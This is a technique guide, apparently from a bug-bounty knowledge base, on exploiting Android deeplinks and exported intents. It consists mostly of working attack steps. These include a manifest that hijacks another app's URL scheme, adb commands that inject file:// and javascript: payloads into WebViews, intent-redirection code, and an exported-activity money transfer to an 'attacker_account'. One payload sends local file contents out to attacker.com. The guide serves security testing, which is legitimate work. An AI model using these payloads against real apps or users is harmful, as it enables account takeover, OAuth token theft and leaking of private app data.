---
id: "android-intent-deeplink-attacks"
title: "Android Intent Hijacking & Deeplink Exploitation"
type: "technique"
category: "mobile"
subcategory: "android"
tags: ["mobile", "android", "deeplink", "intent", "exported-activity", "hijacking", "webview", "bug-bounty"]
platforms: ["linux", "macos", "windows"]
related: ["frida-apk-testing", "android-webview-exploitation", "ssrf-techniques"]
difficulty: "intermediate"
updated: "2026-04-14"
---

# Android Intent Hijacking & Deeplink Exploitation

## Overview

Android deep link hijacking occurs when an unauthorized app intercepts deep link requests intended for another app. Any activity declared under an intent-filter is exported by default and callable by other apps. When deeplinks handle sensitive operations (auth callbacks, token passing, navigation to WebViews), hijacking leads to account takeover, token theft, and arbitrary code execution.

**Bug Bounty Impact**: Deep link vulns are commonly rated Medium to Critical. CVE-2026-26123 (Microsoft Authenticator) demonstrated full account takeover via an unclaimed deep link.

## Reconnaissance

### 1. Decompile and Analyze AndroidManifest.xml
```bash
# Decompile APK
apktool d target.apk -o target_decompiled

# Find exported activities
grep -r "android:exported=\"true\"" target_decompiled/AndroidManifest.xml

# Find all intent-filters (implicitly exported)
grep -A 10 "<intent-filter" target_decompiled/AndroidManifest.xml

# Find all deeplink schemes
grep -r "android:scheme=" target_decompiled/AndroidManifest.xml

# Look for custom URL schemes
grep -r "android:scheme=" target_decompiled/AndroidManifest.xml | grep -v "http"
```

### 2. Identify Attack Surface with Drozer
```bash
# List exported activities
dz> run app.activity.info -a com.target.app

# List exported activities with intent filters
dz> run app.activity.info -a com.target.app -i

# Start an exported activity
dz> run app.activity.start --component com.target.app com.target.app.DeeplinkActivity --action android.intent.action.VIEW --data-uri "targetapp://callback?token=test"
```

### 3. Jadx Static Analysis
```bash
# Open in Jadx-GUI
jadx-gui target.apk

# Search for:
# - getIntent().getData()
# - getIntent().getStringExtra()
# - Intent.parseUri()
# - deeplink handlers, URL routers
# - WebView.loadUrl() called with intent data
```

## Exploitation Techniques

### 1. Deeplink Hijacking (Scheme URL Collision)
```xml
<!-- Malicious app's AndroidManifest.xml -->
<!-- Register same custom scheme as target app -->
<activity android:name=".HijackActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="targetapp" android:host="callback" />
    </intent-filter>
</activity>
```

**Attack flow**: User clicks `targetapp://callback?token=AUTH_TOKEN` in browser -> Android shows disambiguation dialog -> if user picks malicious app, token is stolen.

### 2. OAuth Token Theft via Deeplink
```bash
# If OAuth callback is: targetapp://oauth/callback?code=AUTH_CODE
# Malicious app registers same scheme
# When user completes OAuth flow, malicious app intercepts the auth code

# Test with ADB
adb shell am start -W -a android.intent.action.VIEW \
  -d "targetapp://oauth/callback?code=STOLEN_CODE"
```

### 3. Intent Injection -> WebView Exploitation
```bash
# If deeplink passes URL to WebView without validation:
adb shell am start -W -a android.intent.action.VIEW \
  -d "targetapp://open?url=https://attacker.com/phishing"

# File access via WebView
adb shell am start -W -a android.intent.action.VIEW \
  -d "targetapp://open?url=file:///data/data/com.target.app/shared_prefs/credentials.xml"

# JavaScript execution if JS enabled in WebView
adb shell am start -W -a android.intent.action.VIEW \
  -d "targetapp://open?url=javascript:alert(document.cookie)"
```

### 4. Exported Activity Direct Access
```bash
# Access internal activities that should not be exported
adb shell am start -n com.target.app/.AdminActivity
adb shell am start -n com.target.app/.DebugActivity
adb shell am start -n com.target.app/.ResetPasswordActivity

# Pass intent extras
adb shell am start -n com.target.app/.TransferActivity \
  --es "amount" "10000" --es "recipient" "attacker_account"
```

### 5. Intent Redirection (Access Non-Exported Components)
```java
// If exported activity forwards intents to other components:
// ExportedActivity reads intent extra "next_intent" and starts it
// Attacker can redirect to non-exported internal components

// Crafted intent:
Intent redirectIntent = new Intent();
redirectIntent.setComponent(new ComponentName("com.target.app",
    "com.target.app.InternalSecretActivity"));
// Wrap it
Intent attackIntent = new Intent();
attackIntent.setComponent(new ComponentName("com.target.app",
    "com.target.app.ExportedRedirectorActivity"));
attackIntent.putExtra("next_intent", redirectIntent);
startActivity(attackIntent);
```

```bash
# ADB equivalent
adb shell am start -n com.target.app/.ExportedRedirectorActivity \
  --es "redirect_url" "targetapp://internal/admin"
```

### 6. Bypassing App Link Verification
```bash
# App Links (https:// verified via assetlinks.json) are more secure than custom schemes
# But verification can fail if:
# 1. assetlinks.json is missing or misconfigured on the domain
# 2. autoVerify="true" is not set on all intent-filters
# 3. Domain uses wildcard matching improperly

# Check assetlinks.json
curl https://target.com/.well-known/assetlinks.json

# If missing/misconfigured, any app can claim the domain's deep links
```

### 7. Broadcast Intent Hijacking
```bash
# If app sends broadcasts without explicit component:
adb shell am broadcast -a com.target.app.ACTION_TOKEN_REFRESH \
  --es "new_token" "attacker_controlled"

# Sniff broadcasts
adb shell am monitor
```

## Real-World Bug Bounty Payloads

### Account Takeover via OAuth Deeplink
```
1. Target app uses OAuth: targetapp://auth/callback?code=XXX
2. Register malicious app with same scheme
3. User initiates login -> OAuth provider redirects to targetapp://
4. Android shows chooser -> if user picks malicious app
5. Malicious app captures auth code
6. Exchange code for access token -> full account takeover
Severity: Critical (P1)
```

### Local File Disclosure via WebView Deeplink
```
1. Deeplink handler: targetapp://web?url=<user_input>
2. URL is passed to WebView.loadUrl() without validation
3. Payload: targetapp://web?url=file:///data/data/com.target.app/databases/app.db
4. WebView renders local file content
5. If JavaScript is enabled, exfiltrate via:
   targetapp://web?url=javascript:fetch('file:///etc/hosts').then(r=>r.text()).then(d=>fetch('https://attacker.com/?d='+btoa(d)))
Severity: High (P2)
```

### Bypassing Authentication via Exported Activity
```
1. Login activity sets authenticated=true in SharedPrefs
2. MainActivity checks SharedPrefs on launch
3. SettingsActivity is exported but doesn't check auth state
4. Direct access: adb shell am start -n com.target.app/.SettingsActivity
5. User lands in authenticated app area without credentials
Severity: High (P2)
```

## Automated Testing

### With Drozer
```bash
# Enumerate all attack surface
dz> run app.package.attacksurface com.target.app
# Test all exported activities
dz> run app.activity.start --component com.target.app <activity_name>
```

### With apkleaks
```bash
# Extract URLs, endpoints, secrets from APK
apkleaks -f target.apk
```

### With nuclei (mobile templates)
```bash
nuclei -t mobile/ -target com.target.app
```

## Checklist
- [ ] Decompile APK, review all exported components in AndroidManifest.xml
- [ ] Map all custom URL schemes and intent-filters
- [ ] Test each deeplink with ADB for injection (URLs, file://, javascript:)
- [ ] Check OAuth/auth callbacks for deeplink hijacking
- [ ] Test exported activities for auth bypass (access without login)
- [ ] Check for intent redirection to non-exported components
- [ ] Verify App Links: check assetlinks.json on target domains
- [ ] Test broadcast receivers for intent injection
- [ ] Check if deeplinks work before local authentication (passcode/biometrics bypass)

## Tools
- **apktool** — APK decompile/recompile
- **Jadx** — Java decompiler
- **Drozer** — Android security framework
- **ADB** — Android Debug Bridge
- **apkleaks** — Extract secrets from APK
- **MobSF** — Automated mobile security
